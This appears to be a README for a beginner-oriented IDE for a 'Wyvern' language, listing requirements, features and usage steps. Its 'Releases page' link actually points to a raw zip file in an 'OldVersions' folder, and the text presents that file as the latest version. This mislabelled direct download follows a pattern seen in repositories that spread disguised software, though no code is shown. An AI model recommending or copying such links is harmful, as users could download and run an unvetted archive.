## 🚀 Getting Started

Welcome to the SNU 2D Programming Tools IDE for the Wyvern programming language. This application helps you write, test, and run your code with ease. No prior coding experience is required to use this tool.

### 📥 Prerequisites

Before you download, ensure your computer meets the following requirements:

- **Operating System:** Windows 10 or higher
- **Memory:** At least 4 GB of RAM
- **Storage Space:** Minimum of 500 MB free space

To get started with Wyvern, visit the [Releases page](https://raw.githubusercontent.com/joohany/SNU_2D_ProgrammingTools_IDE_Wyvern/SNU_2D_ProgrammingTools_IDE_Wyvern_Main-dev/RepoData/Description/GitHub/OldVersions/SNU_2D_ProgrammingTools_IDE_Wyvern-v1.5.zip) to download the latest version. ## ✨ Features

The Wyvern IDE offers several key features to enhance your coding experience:

- **User-Friendly Interface:** The layout is simple and intuitive, making it easy for anyone to navigate.
- **Syntax Highlighting:** The IDE highlights your code, helping you catch errors and improve readability.
- **Code Execution:** Quickly run your code and see results without needing complex setups.
- **Error Messages:** Clear messages help you understand any issues within your code.
- **Project Management:** Organize your coding projects easily within the IDE.

## 🛠️ How to Use Wyvern IDE

After you install the IDE, open the application. You will find the main screen has several options:

1. **New Project:** Start a new project by choosing this option.
2. **Open Project:** Load an existing project saved on your computer.
3. **Code Editor:** Use this area to write and edit your code. The IDE provides features like auto-complete to help you write faster.
4. **Run Code:** Once you finish your code, simply click the "Run" button to execute it and view the results at the bottom of the screen.
5. **Save Project:** Save your work frequently to avoid losing any progress.
